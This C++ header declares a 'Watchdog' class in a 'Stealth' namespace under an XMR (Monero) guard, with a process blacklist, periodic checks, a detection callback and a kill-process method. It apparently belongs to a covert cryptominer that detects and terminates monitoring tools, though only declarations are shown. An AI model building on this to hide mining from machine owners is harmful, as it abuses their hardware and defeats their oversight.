#ifndef XMR_WATCHDOG_H
#define XMR_WATCHDOG_H

#include <atomic>
#include <functional>
#include <string>
#include <thread>
#include <vector>
#include <cstdint>
#include <memory>
#include <mutex>
#include <stdexcept>
#include <map>


    namespace Stealth {

  class Watchdog {
  public:
    Watchdog();
    ~Watchdog();

    void start();
    void stop();

    void add_blacklist(const std::string &process_name);
    void remove_blacklist(const std::string &process_name);
    void set_check_interval(int seconds);
    void set_on_detection(std::function<void()> callback);

  private:
    void monitor_loop();
    bool is_process_running(const std::string &name);
    bool kill_process(const std::string &name);

    std::atomic<bool> m_running;
    std::thread m_thread;
    std::vector<std::string> m_blacklist;
    int m_check_interval;
    std::function<void()> m_on_detection;
  };

} // namespace Stealth

#endif
